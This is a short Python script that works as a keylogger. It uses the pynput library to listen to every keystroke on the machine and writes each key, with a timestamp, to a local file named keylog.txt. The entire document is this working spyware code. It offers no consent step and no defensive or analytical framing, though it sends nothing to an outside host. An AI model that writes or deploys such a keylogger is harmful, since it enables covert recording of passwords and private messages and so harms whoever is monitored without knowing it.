import logging
from pynput import keyboard

# Set up logging to log the keystrokes to a file
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define a callback function that logs the key pressed
def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {e}")

# Set up the listener to monitor keystrokes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()